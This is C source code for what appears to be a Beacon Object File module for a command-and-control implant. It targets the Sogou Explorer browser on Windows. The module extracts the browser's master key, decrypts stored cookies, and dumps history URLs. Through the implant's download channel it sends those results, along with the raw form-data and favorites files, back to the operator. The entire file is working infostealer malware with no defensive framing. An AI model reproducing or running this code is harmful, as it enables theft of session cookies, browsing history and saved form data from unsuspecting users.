#include "plg_common.h"

static int pjoin(char *o, size_t z, const char *a, const char *b) {
	int n = MSVCRT$_snprintf(o, z, "%s\\%s", a, b);
	return (n > 0 && (size_t)n < z) ? 0 : -1;
}

static void og_out_name(char *dst, size_t dz, const char *prefix, const char *suffix) {
	if (prefix && prefix[0])
		MSVCRT$_snprintf(dst, dz, "%s_%s", prefix, suffix);
	else
		MSVCRT$_snprintf(dst, dz, "%s", suffix);
}

static int dir_ok(const char *p) {
	DWORD a = KERNEL32$GetFileAttributesA(p);
	return (a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY));
}

static void sogou_cookies(const unsigned char *mk, const char *ckpath, formatp *f) {
	unsigned char *raw = NULL;
	DWORD rlen = 0;
	PlgSqlite *db;
	int i, n;
	if (plg_read_file_a(ckpath, &raw, &rlen) < 0)
		return;
	db = plg_sqlite_open(raw, rlen);
	plg_free(raw);
	if (!db)
		return;
	if (plg_sqlite_read_table(db, "cookies") < 0) {
		plg_sqlite_close(db);
		return;
	}
	BeaconFormatPrintf(f, "=== OldSogou cookies ===\n");
	n = plg_sqlite_row_count(db);
	for (i = 0; i < n; i++) {
		const char *host = plg_sqlite_get(db, i, "host_key");
		const char *name = plg_sqlite_get(db, i, "name");
		const char *ev = plg_sqlite_get(db, i, "encrypted_value");
		unsigned char dec[8192];
		size_t decl = sizeof(dec);
		if (!host || !name || !ev)
			continue;
		if (plg_chrome_decrypt(mk, ev, NULL, 0, dec, &decl, 1) < 0)
			continue;
		dec[decl < sizeof(dec) - 1 ? decl : sizeof(dec) - 1] = 0;
		BeaconFormatPrintf(f, "[%s]\t{%s}={%s}\n", host, name, (char *)dec);
	}
	plg_sqlite_close(db);
}

static void sogou_history(const char *histpath, formatp *f) {
	unsigned char *raw = NULL;
	DWORD rlen = 0;
	PlgSqlite *db;
	int i, n;
	if (plg_read_file_a(histpath, &raw, &rlen) < 0)
		return;
	db = plg_sqlite_open(raw, rlen);
	plg_free(raw);
	if (!db)
		return;
	if (plg_sqlite_read_table(db, "UserRankUrl") < 0) {
		plg_sqlite_close(db);
		return;
	}
	BeaconFormatPrintf(f, "\n=== OldSogou history (UserRankUrl) ===\n");
	n = plg_sqlite_row_count(db);
	for (i = 0; i < n; i++) {
		const char *u = plg_sqlite_get(db, i, "id");
		if (u)
			BeaconFormatPrintf(f, "%s\n", u);
	}
	plg_sqlite_close(db);
}

static void upload_raw(const char *path, const char *outname) {
	unsigned char *b = NULL;
	DWORD n = 0;
	if (plg_read_file_a(path, &b, &n) < 0)
		return;
	if (b && n > 0)
		AxDownloadMemory((char *)outname, (char *)b, (int)n);
	plg_free(b);
}


void plg_oldsogou_dump(const char *appdata, const char *file_prefix) {
	char root[PLG_MAX_PATH], webkit[PLG_MAX_PATH], ls[PLG_MAX_PATH], def[PLG_MAX_PATH], ck[PLG_MAX_PATH];
	char hist[PLG_MAX_PATH], fd3[PLG_MAX_PATH], fav3[PLG_MAX_PATH];
	unsigned char mk[32];
	formatp f;
	char *data;
	int sz;
	char name[160], sfx[96];
	if (pjoin(root, sizeof(root), appdata, "SogouExplorer") != 0)
		return;
	if (pjoin(webkit, sizeof(webkit), root, "Webkit") != 0)
		return;
	if (!dir_ok(webkit))
		return;
	if (pjoin(def, sizeof(def), webkit, "Default") != 0)
		return;
	if (!dir_ok(def))
		return;
	if (pjoin(ls, sizeof(ls), webkit, "Local State") != 0)
		return;
	if (plg_chrome_master_key(ls, mk) < 0)
		return;
	BeaconFormatAlloc(&f, 512 * 1024);
	if (pjoin(ck, sizeof(ck), def, "Cookies") == 0)
		sogou_cookies(mk, ck, &f);
	if (pjoin(hist, sizeof(hist), root, "HistoryUrl3.db") == 0)
		sogou_history(hist, &f);
	data = BeaconFormatToString(&f, &sz);
	MSVCRT$_snprintf(sfx, sizeof(sfx), "OldSogouExplorer_dump.txt");
	og_out_name(name, sizeof(name), file_prefix, sfx);
	if (data && sz > 16)
		AxDownloadMemory(name, data, sz);
	BeaconFormatFree(&f);
	if (pjoin(fd3, sizeof(fd3), root, "FormData3.dat") == 0 &&
	    KERNEL32$GetFileAttributesA(fd3) != INVALID_FILE_ATTRIBUTES) {
		MSVCRT$_snprintf(sfx, sizeof(sfx), "OldSogou_FormData3.dat");
		og_out_name(name, sizeof(name), file_prefix, sfx);
		upload_raw(fd3, name);
	}
	if (pjoin(fav3, sizeof(fav3), root, "favorite3.dat") == 0 &&
	    KERNEL32$GetFileAttributesA(fav3) != INVALID_FILE_ATTRIBUTES) {
		MSVCRT$_snprintf(sfx, sizeof(sfx), "OldSogou_favorite3.dat");
		og_out_name(name, sizeof(name), file_prefix, sfx);
		upload_raw(fav3, name);
	}
	BeaconPrintf(CALLBACK_OUTPUT, "[+] OldSogouExplorer (Webkit)");
}
